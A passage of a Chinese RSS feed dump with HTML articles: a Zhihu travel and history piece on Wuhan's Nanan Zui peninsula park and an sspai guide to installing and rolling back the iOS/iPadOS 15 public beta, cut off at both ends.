位英文翻译志愿者。</p>\n<p>对于没玩过《赛博朋克酒保行动》（VA-11 Hall-A: Cyberpunk Bartender Action）的朋友，你可以在 XGP 库里找到这款真正的赛博朋克游戏，并且官方支持中文。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/ddebbe7719eb1e97b509133f1a612daa.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/833412cf4219ce6b0e09547d393a60d8.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/d7ade5782e0658ac99ffb6043a32874d.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/30/3383c413060c86f0745d63fd70be7c98.png\"></figure><p>📧 纠错/反馈/提问 Email：<a href=\"mailto:xatest@gmail.com\" target=\"_blank\">xatest@gmail.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67484"},{"title":"武汉有哪些隐藏在城市深处的小众古迹？","date":"2021-07-02 06:45:08","description":"\n<p><b>【野岛乐园南岸嘴】</b><br></p>\n<p>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p>武汉许多地方，久仰大名、却从未去过。南岸嘴是其一。</p>\n<p><b>长江和汉水在南岸嘴相遇。</b>龟山的绿意葱茏往江心延伸出一块绿色半岛，汉水绕过半岛尖尖汇入长江。南岸嘴就是那块半岛。</p>\n<p><b>这里是武汉人不敢妄动的一块地。</b>1998年以前，南岸嘴住满人。抗洪之后，修堤治水，老居民全部搬离。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-94583e264e10b5d9cc9a7b5498a3e995_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"3243\" data-watermark=\"original\" data-original-src=\"v2-94583e264e10b5d9cc9a7b5498a3e995\" data-watermark-src=\"v2-231f305e19e34ade81c00a88b818115a\" data-private-watermark-src=\"v2-206c6ff8d954dbcfa5fcf270ad658a30\"></p>\n<p><br></p>\n<p>两江交汇核心地段，上海陆家嘴集齐三件套，重庆朝天门扬起百亿“风帆”来福士，我们南岸嘴就不一样了，<b>“闲置”20多年，不种高楼，专注种树，至今仍是一座绿色滨江公园。</b></p>\n<p>一次办公室闲聊，同事说他招待外地朋友玩武汉，南岸嘴是必去的一站，“去了每个人都哇哇惊叹，屡试不爽。”</p>\n<p>今年夏天，我第一次“登岛”南岸嘴，同事所言不虚，<b>仿佛误入80、90年代的武汉，一座充斥旧浪漫的野趣乐园。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8f16df17ad7293e8e1319af51aa16dc4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"188\" data-watermark=\"original\" data-original-src=\"v2-8f16df17ad7293e8e1319af51aa16dc4\" data-watermark-src=\"v2-59b22a400f013031da5c18a56ead8128\" data-private-watermark-src=\"v2-8cdcf2b9e822056d8f16cc42bff74bd1\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2878711a541ee431d9c1859e72acc7c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-2878711a541ee431d9c1859e72acc7c0\" data-watermark-src=\"v2-77608542cad43a2647f33e254bf5e479\" data-private-watermark-src=\"v2-500ee6efa6c6afa9787f182a67e50940\"></p>\n<p><br></p>\n<p>南岸嘴江滩公园入口没有招牌。跟着导航七弯八拐，穿过两根贴瓷砖的大白柱，就算进了公园。泥土和树叶香气扑面，往深处走近河堤，闻到淡淡藻腥。</p>\n<p><br></p>\n<p>作为一个城市中央的公园，<b>南岸嘴没有标配的健身器材，全靠自娱自乐。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a4225bdf601e4c3a5aac02d85493328b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-a4225bdf601e4c3a5aac02d85493328b\" data-watermark-src=\"v2-5f74f073cc28c1fe6bfd79bd3148e0d7\" data-private-watermark-src=\"v2-e469e46c00b680c1f637c9dcb92f3564\"></p>\n<p><br></p>\n<p><b>空地画白线，便有了网球场</b>，绿树环绕，自带水景，折服于民间智慧。</p>\n<p>晴川桥下，一条泳裤扎进夏天。空手而来，黑轮胎救生圈十元一租，<b>泳衣现场购买，随到随玩。</b>没有更衣室，临时起意的T恤牛仔裤在河堤堆成小山，白袜子塞进棕色皮凉拖。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e816f943a076ec5165225575ace3a9ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e816f943a076ec5165225575ace3a9ee\" data-watermark-src=\"v2-18c593cb92f9846eb9af22f98ad4b6a3\" data-private-watermark-src=\"v2-e718c1d244c457399d78680f41629bb8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4bec2a5b6d7a303eae598716f7fc9076_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-4bec2a5b6d7a303eae598716f7fc9076\" data-watermark-src=\"v2-27cac5eeb016b86a684dcea59e7c1c4c\" data-private-watermark-src=\"v2-4b9a699c6d0b95f384328d2ad985cb2f\"></p>\n<p><br></p>\n<p>打气球，十元一盘，长发及腰的女老板鼓起腮帮子吹气球，播放上世纪的动次打次，在夜幕降临时与对岸 IM HAN 酒吧隔岸和鸣。</p>\n<p><b>街头游戏仅需10元。爱情免费。</b></p>\n<p>江堤上的人在夜里分两派：一人一竿的钓友，成双成对的恋人。</p>\n<p>恋人们相互依偎，看黄鹤楼点亮，二七桥、二桥、大桥、鹦鹉洲、杨泗港依次璀璨。面朝绿地中心，背靠龟山电视塔，<b>平视这座城市从今往后的天际线，仰望此刻的月亮和历代的星辰。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-fb16bb959be46dcc44657a69567e9afd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-fb16bb959be46dcc44657a69567e9afd\" data-watermark-src=\"v2-f39468465b9ea2da05a596235ad874bb\" data-private-watermark-src=\"v2-934815cad1a26c59fa272169d5646845\"></p>\n<p><br></p>\n<p>在南岸嘴，双目进化成鱼眼，<b>江景视野超300°开阔。这里听到的汽笛声比别处江滩大一些</b>，我以为是幻觉，问了许多人都有相同感受。</p>\n<p><b>南岸嘴衔住一清一浊，180亩野岛藏着令人心旌荡漾的平价夏天</b>，它是一块穿越旧时光的城中飞地，不办一场户外音乐节，实在可惜。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-65c69499fe1510f2e0f0f36ee5f1e9ad_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-65c69499fe1510f2e0f0f36ee5f1e9ad\" data-watermark-src=\"v2-7a19b453d04284cf7a8a8573f740ce9d\" data-private-watermark-src=\"v2-4a4e59907d827c7560c9d75683f1ae29\"></p>\n<p><br></p>\n<p>这里与武汉无限远，又无限近。<b>城市中央凭空长出一片森林</b>，出逃此地，又被江景壮阔和生猛野趣包围夹击。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-480d054d1e8d475c1bfde6f17a23e877_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"205\" data-watermark=\"original\" data-original-src=\"v2-480d054d1e8d475c1bfde6f17a23e877\" data-watermark-src=\"v2-5b781b2ced2fbefb84fee5d1e933f8fa\" data-private-watermark-src=\"v2-af9f5125d928424cd165f5378f3dc962\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6cb19ea8d5e39859ca37474042fb5c08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1592\" data-watermark=\"original\" data-original-src=\"v2-6cb19ea8d5e39859ca37474042fb5c08\" data-watermark-src=\"v2-39443a5b3846572f92f45ec96587ab1a\" data-private-watermark-src=\"v2-b81e1a65102964ec9db1423b58480e33\"></p>\n<p><br></p>\n<p>来寻乐的大多是汉阳居民。也有六渡桥拐子骑电动车来漂流，车后挂一黑轮胎，车前载一黑一黄两条田园犬，过桥就到，不远。</p>\n<p><b>人在车胎仰卧，顺水漂，狗在岸上跟着跑</b>，漂到南岸嘴起水，到树荫下走两盘棋。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d8b759dd36bd2f08c3e46c6463c16530_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-d8b759dd36bd2f08c3e46c6463c16530\" data-watermark-src=\"v2-c53711f8ee2859365f2ef052d4ca8f88\" data-private-watermark-src=\"v2-eec44bc57c038faafda56ede0eb5a435\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-248c5a04477676ada5ab4753b4239528_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1599\" data-watermark=\"original\" data-original-src=\"v2-248c5a04477676ada5ab4753b4239528\" data-watermark-src=\"v2-e7fbea022ab4fdeffa76db01d4688c5e\" data-private-watermark-src=\"v2-091d22e804d6b9f66f0edc9d7bb723ba\"></p>\n<p><br></p>\n<p><b>南岸嘴男子俱乐部，一个松散组织，或者说几乎没有组织。</b>没有微信群约时间，没有固定接头地点，沿堤岸支起鱼竿，先到先占据有利地形，席地摆开楚河汉界，棋逢对手一坐一下午。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0991218545aa44a16b4112ecfcbbd61_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1614\" data-watermark=\"original\" data-original-src=\"v2-e0991218545aa44a16b4112ecfcbbd61\" data-watermark-src=\"v2-483edd5ecdf4c5e6cf0d9b317c9df1b4\" data-private-watermark-src=\"v2-d53e69724ee930ab27e09a0fb7274d82\"></p>\n<p><br></p>\n<p>多年混得脸熟，玩高兴了会在天黑之后约着喝点小酒，宵个夜再回家。至于下次何时相见，全靠有缘。</p>\n<p>住钟家村的男人，双肩包拉链伸出一把网球耙子，<b>他说这里是武汉的肺，一块宝地。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-89c1fa8f6d3c9918e40a49f6f163d026_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-89c1fa8f6d3c9918e40a49f6f163d026\" data-watermark-src=\"v2-76604b4dd6a8b939e0e694dec8701b7e\" data-private-watermark-src=\"v2-aa7986cdb6bf6ea3c2a75ee2367849d7\"></p>\n<p><br></p>\n<p>“南岸嘴”地名有典故，相传明朝嘉靖皇帝从安陆（今钟祥）赴京登基，乘船经此。官员百姓肃立汉水两岸，争相一睹龙颜，<b>接驾渡口被称为“接驾嘴”和“南岸接驾嘴”</b>，谐音流传成了“集家嘴”和“南岸嘴”。</p>\n<p>明清时期，南岸嘴连同汉口沿河一带是交通、商贸要津。1998年以前，这里是一片密集民居。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-beebd9509c225a11c93253075cf6946d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-beebd9509c225a11c93253075cf6946d\" data-watermark-src=\"v2-68f930b774997ef6e55832c3d4db9361\" data-private-watermark-src=\"v2-e6986801691a14aa9a54a78b80580f60\"></p>\n<p><br></p>\n<p>从龟北路国棉社区十分钟走到南岸嘴。高公街走到头，晴川桥桥墩下是从前的渣砖二巷。夏天爬船顶跳水，汛期过后，<b>蹲在退水的沙土堤挖铜钱</b>。这里的人记忆中都有一个消失于湍流的小伙伴，有人说是被码头趸船吸了去，有人说淹死的都是会游泳的。不会水的人不敢往江心。</p>\n<p>两江交汇处水患不断，洪峰过境，南岸嘴只剩一片红屋顶。1998年后，政府出资，2650余户居民迁至安全地带。<b>汉阳桃花岛城市花园小区，80%居民曾在南岸嘴生活。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5477d4c11bbae8545b1c03240223e138_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"742\" data-watermark=\"original\" data-original-src=\"v2-5477d4c11bbae8545b1c03240223e138\" data-watermark-src=\"v2-914447b417792083e080e8f5b7dadf4f\" data-private-watermark-src=\"v2-a40e64c32204c6ddba6ef7079f548c69\"></p>\n<p><br></p>\n<p>二十年前依依离别，原住“岛民”常会回家看看。<b>绿荫蔽日，已不是从前巷陌拥挤。对比两江对岸的华灯高楼，南岸嘴密林又仿佛停住了时间。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-7ebffdac8353399594fe59fc5b8e992e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"901\" data-rawheight=\"193\" data-watermark=\"original\" data-original-src=\"v2-7ebffdac8353399594fe59fc5b8e992e\" data-watermark-src=\"v2-562928245822a4ebe577ac06c810043b\" data-private-watermark-src=\"v2-074e7de3152e7ad895ad80bb9719db62\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1e6978dc5e916008ad396b342176e388_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1464\" data-watermark=\"original\" data-original-src=\"v2-1e6978dc5e916008ad396b342176e388\" data-watermark-src=\"v2-4ea27710b345a1a83dd164ff7640f449\" data-private-watermark-src=\"v2-02d54c23976de6e25664772bf7ffdc3b\"></p>\n<p><br></p>\n<p><b>“谁不想打这里主意？这是蛮宝贵的地方啊，一般的开发商，想都莫想。”</b>家住郭茨口的白发爷爷，望着南岸嘴尖尖角，吐字有力。</p>\n<p>为了看这几天的灯光秀，爷爷搬塑料板凳，六点不到就到南岸嘴占位置，他说，孙姑娘今年四岁，没看过长江，“这里是看江最好的地方。”</p>\n<p><b>最后一批居民在2000年搬离。此后，南岸嘴规划多次列入“两会”议题。</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-23957cda4aec05b3908e365b88ede3a7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\"></p>\n<p><br></p>\n<p><b>2001年，武汉面向全球征集南岸嘴规划</b>，在武展办了一场展览，展出来自东京、香港等地11个入围方案。南岸嘴出生长大的朱师傅和老朋友专程去看，有的说要建450米高金色龙塔，有的是酷似卢浮宫的水晶三角锥，还有片片白帆构筑的音乐厅……</p>\n<p>南岸嘴被誉为“中国角”，传说中国丹田在这里，其实是地形与“德国角”相似。德国科布伦茨，莱茵河与摩泽尔河交汇，德国角竖立着威廉一世雕像。</p>\n<p><b>武汉市民之家、琴台大剧院都曾考虑落址“中国角”。20多年过去，地标建筑没等来，南岸嘴依旧亭亭如盖。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-92f85469cf412d533f012f9a1d0b0fc5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-92f85469cf412d533f012f9a1d0b0fc5\" data-watermark-src=\"v2-547e0e204a45192b729c4b06a4ac83d2\" data-private-watermark-src=\"v2-f9f06beff4749a6d48c005df362bc6ad\"></p>\n<p><br></p>\n<p>有人惋惜南岸嘴冷清，也有人说武汉不缺地方盖楼，保留绿色滨水公园，蛮好。（要是路灯修好，公厕弄干净，更好）</p>\n<p>伸入江心的尖尖角是天然水位指标，<b>枯水期露出边缘参差的滩涂沙地，走上去离江心特别近。</b>夏天水涨至防护堤，画出一条平顺的弧。</p>\n<p>运送白砂的船只在龙王庙打舵入汉水，像利刃入喉，接近晴川桥时，依照岸边写有“鸣”字的指示牌，拉响汽笛。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e222841d26a2627262da0f451167644f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-e222841d26a2627262da0f451167644f\" data-watermark-src=\"v2-c53d4c47698dbb8fb60ae47893a71e21\" data-private-watermark-src=\"v2-b612ed8cc6097d5f02a40a1adeed338f\"></p>\n<p><br></p>\n<p>向武汉市规划局的朋友打探南岸嘴最新消息，回复是：“还没定，目前是不动。”</p>\n<p>也好。没想清楚，宁可不动。<b>留白总比留遗憾要好。</b></p>\n<p><br></p>\n<p>///</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-eb68b99059346d5c97d0bf0f01056997_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1621\" data-watermark=\"original\" data-original-src=\"v2-eb68b99059346d5c97d0bf0f01056997\" data-watermark-src=\"v2-70fff652966bff1f4325e79497200bdc\" data-private-watermark-src=\"v2-195ea030f64756a55eb0318296209ac1\"></p>\n<p><br></p>\n<p>从武昌坐轮渡过江，大桥、电视塔、晴川桥，渐入眼帘。船行接近南岸嘴，心生好奇，突出的绿色半岛上面什么样？<b>怎么一清一浊交融了几百年还没混成一种颜色？</b></p>\n<p>没等回过神，船舷侧转，向江汉关驶去。</p>\n<p>汉水流至汉阳，在相当长一段时间里，并不存在一个稳定的入江口。放荡摇摆的汉水在明朝成化年间有了定性，择龟山北面注入长江。</p>\n<p>再后来，汉水以北诞生东方芝加哥，汉水以南的尖尖角，帆船点点停泊，<b>商贾百姓迎来送往，如今又回归芳草萋萋。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb83a16d9268dedd0b33f31216e6a4fd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1682\" data-watermark=\"original\" data-original-src=\"v2-cb83a16d9268dedd0b33f31216e6a4fd\" data-watermark-src=\"v2-89799b851113add84ed2c5360991a635\" data-private-watermark-src=\"v2-118295da4c92b45cdf0c853749fcf516\"></p>\n<p><br></p>\n<p>下午五点，穿黑色泳裤的大桥局电焊工，牵出不满半岁的马犬，到南岸嘴调教狗子水性。</p>\n<p>五点半，一家三口推冰箱到晴川桥下支摊，卖冰水和烤肠，等待六点，跑步团喊口号健步如飞。</p>\n<p>太阳落山后到南岸嘴，嗅觉是最先打开的感官，泥土草腥，因为除了江堤一带，夜晚这里几乎没有路灯，树多蚊子多。<b>热闹的灯光秀借给南岸嘴微弱的光，老婆婆说这样也好，“鸟不会核跑</b>（吓跑）<b>。”</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-916220113ff288bddbd433a1fb4d1919_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1620\" data-watermark=\"original\" data-original-src=\"v2-916220113ff288bddbd433a1fb4d1919\" data-watermark-src=\"v2-685a37930e1af4caee7643a1785029a1\" data-private-watermark-src=\"v2-dd128e8805688e6b78c6c2c5d8bf2766\"></p>\n<p><br></p>\n<p>最近一次去南岸嘴是下午四点，<b>在晴川桥下发现三张蒙着布的台球桌</b>，积满灰。一个中年男人从一间孤零零的办公室伸出脑袋，递来球竿，“自己玩，不要钱，桌上有巧克。” 他说从前十元一盘，老板不做了，而后转动钥匙，跨着电动车扬长而去。</p>\n<p><br></p>\n<hr>\n<p><br></p>\n<p><b>  插播一则课外知识</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c25788e5dfd391a80204745642305983_720w.jpg?rss\" data-caption=\"●武汉南岸嘴影像对比（左图 1966年 右图 2019年）\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"original\" data-original-src=\"v2-c25788e5dfd391a80204745642305983\" data-watermark-src=\"v2-3bd58a509ecf4d3523470aaedea9aba9\" data-private-watermark-src=\"v2-babfbc035f067b5b119e17727da78a04\"></p>\n<p><br></p>\n<p>如今的南岸嘴面积比1998年以前“小”一些。</p>\n<p>1998年以前，汉水几乎是一个直角拐弯，撞向南岸嘴。1998年8月底，整治龙王庙水利工程开工，第一件事就是拆迁南岸嘴，拉直汉江河道。南岸嘴沿江削坡60米，还路于水，从前的直角转弯，变得缓和，水流也变得温顺。</p>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">10 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/395157045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉全员检测完成后会不会成为全国最安全的城市？</a><br><a href=\"http://www.zhihu.com/question/352383201?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">第一次到武汉，武汉是个怎样的城市呢？</a><br>\n","link":"http://www.zhihu.com/question/451982188/answer/1970788130?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"iOS / iPadOS 15 公测版来了：新系统升降级指南 &amp; 注意事项","date":"2021-07-02 06:26:23","description":"\n<p>7 月 1 日，Apple 推送了 iOS 15、iPadOS 15 的首个 Public Beta 公开测试版本，用户可以注册参与 <a href=\"https://beta.apple.com/sp/zh/betaprogram/welcome?locale=zh\" target=\"_blank\">Apple Beta 版软件计划</a> 更新公测版系统，提前体验新功能。</p>\n<p><strong>由于测试版系统可能存在影响正常使用的 Bug，对于软件的兼容性也无法保证，我们不推荐你现在将主要设备升级到 Public Beta 版本。</strong>如果你有合适的设备，想在第一时间体验新系统功能，少数派帮你准备了这份升降级指南。</p>\n\n<div>\n<p>WWDC21 开发者大会期间，少数派也为大家带来了针对新系统、新技术的持续跟进和报道，也与几位长期关注和参与 Apple 生态工作的开发者和产品人进行了深度讨论。为了让你更加完整和系统性地回顾这些内容，少数派也将它们整理成了专题页面，你可以访问下方链接查看我们带来的热点资讯、深度报道以及之后更新的更多内容。</p>\n<p>📱 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\" class=\"insert-link\">少数派带你看 WWDC21</a></p>\n</div>\n\n<h2><strong>哪些设备可以升级新系统</strong></h2>\n<p>据 Apple 官网提供的信息，iOS 15 支持 iPhone 6s / 6s Plus (2015 年) 以及之后推出的产品，另外还支持第七代 iPod touch。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/1812919a8f803ed152879d953fc25ce9.png\"></figure><p>iPadOS 15 方面，iPad Air 2 (2014 年) 以及之后推出的 iPad 产品均能升级新版系统。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/2c5535cd276d4b03f84e8312b86051f3.png\"></figure><h2><strong>升级前的注意事项</strong></h2>\n<p>在升级系统之前，第一件要做的事就是备份设备的重要数据了。虽然目前大部分第三方应用的数据可以通过 iCloud 或者其自己提供的云存储服务进行备份，但是仍有一些数据需要用户自行备份，比如微信聊天记录等。</p>\n<p>如果你的 iCloud 空间有限，还可以选择用 Mac 上的 Finder 或者 Windows 上的 iTunes，在电脑本地备份系统数据。为了保证数据传输的稳定性和效率，我们推荐你使用有线连接的方式连接电脑和手机、平板设备，而不要使用无线方式进行连接和备份。如果你希望备份账户密码、健康应用和 Homekit 中的数据，请勾选「加密本地备份」。之后选择立即备份，等待备份完成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/067a1aaf4953bfae4f4902560b044a22.png\"><figcaption>加密备份数据</figcaption></figure><p>备份完成后，可以点击下方「管理备份」按钮，查看备份记录。右键点击备份，选择归档，确保该备份不会被后续新备份覆盖。然后你就可以安装准备新系统了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/41b5198d278ba4fc81b0fba876ff669b.png\"><figcaption>归档备份，防止备份被覆盖</figcaption></figure><h2><strong>如何升级新系统</strong></h2>\n<p>升级新系统之前，你需要先加入 <a href=\"https://beta.apple.com/sp/zh/betaprogram/\" target=\"_blank\">Apple Beta 版软件计划</a>。</p>\n<p>如果你需要升级 iPhone / iPad，请使用 iPhone / iPad 访问 Apple Beta 版软件计划页面并点击注册按钮，然后跟随引导完成注册。之后，在页面中下载描述文件，系统会提示安装配置描述文件，点击「允许」。</p>\n<figure class=\"ss-imgRows\" figcaption=\"点击「允许」\"><img src=\"https://cdn.sspai.com/2021/07/01/b0697d2abc63fb185f3826b887da5a31.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/01/86bb7e08c01ee05b7559da8281615181.PNG\" alt=\"\"></figure><p>在系统设置中找到「通用 - 描述文件」选项，选择刚刚下载的描述文件，点击「安装」，输入设备锁屏密码并同意安装协议，重启你的 iOS / iPadOS 设备。之后，你就可以在「设置 - 通用 - 软件更新」中更新设备了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/2b9ec9e5fc98330bfba2b7cdbb58c9f3.png\"></figure><h2><strong>如何降级正式版系统</strong></h2>\n<p>若你在升级测试版系统之后想降级更稳定的正式版系统，可以通过以下方法操作。</p>\n<p>你可以选择提前下载 iOS / iPadOS 15 的系统固件包（.ipsw 格式），或者在进入恢复模式之后使用 Mac 上的 Finder 或 Windows 上的 iTunes 自动下载固件包。</p>\n<p>你可以根据设备的不同，选择以下方式进入恢复模式：</p>\n<ul>\n<li>配备面容 ID 的 iPad 机型：按下调高音量按钮再快速松开。按下调低音量按钮再快速松开。按住顶部按钮，直到设备开始重新启动。继续按住顶部按钮，直到设备进入恢复模式。</li>\n<li>iPhone 8 或更新机型：按下调高音量按钮再快速松开。按下调低音量按钮再快速松开。最后，按住侧边按钮，直到看到恢复模式屏幕。</li>\n<li>iPhone 7、iPhone 7 Plus 和 iPod touch（第 7 代）：同时按住顶部（或侧边）按钮和调低音量按钮。持续按住这两个按钮，直到您看到恢复模式屏幕。</li>\n<li>配备主屏幕按钮的 iPad、iPhone 6s 或更早机型和 iPod touch（第 6 代）或更早机型：同时按住主屏幕按钮和顶部（或侧边）按钮。持续按住这两个按钮，直到您看到恢复模式屏幕。</li>\n</ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2020/07/10/85edc1b7b66ff6848ec7cb127a9652a6.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"><figcaption>恢复模式界面</figcaption></figure><p>接下来，Finder 或 iTunes 会检测到你有一台处于恢复模式的设备，并询问你是否要恢复或更新设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/07/08/d7d87fa55d65aaf418fc30dd38708ede.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p>如果你下载了 .ipsw 文件，按住 option 键（Windows 为 Shift 键）并点击「恢复」，选择下载好的 .ipsw 文件；如果没有，直接点击「恢复」选项即可。之后你的手机数据将被抹除，系统将恢复至最新的稳定版本。恢复完成后，你可以继续使用 Finder 或 iTunes 恢复之前备份的设备数据。</p>\n<p>以上便是 iOS / iPadOS 15 公开测试版本的升降级流程，如果你有其它问题，欢迎通过评论与我们交流。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，阅读更多 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\">WWDC21 专题报道</a> 👨🏻‍💻</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67514"},{"title":"熟悉的听感、又略有不同，千元级无线降噪音乐耳机：Beats Studio Buds 体验","date":"2021-07-02 01:40:03","description":"\n<p>Beats Studio Buds 是 Beats 推出的首款支持主动降噪的真无线蓝牙入耳式耳机，支持主动降噪、通透模式、Apple 查找等功能，也是近年唯一没有使用 Apple W1 / H1 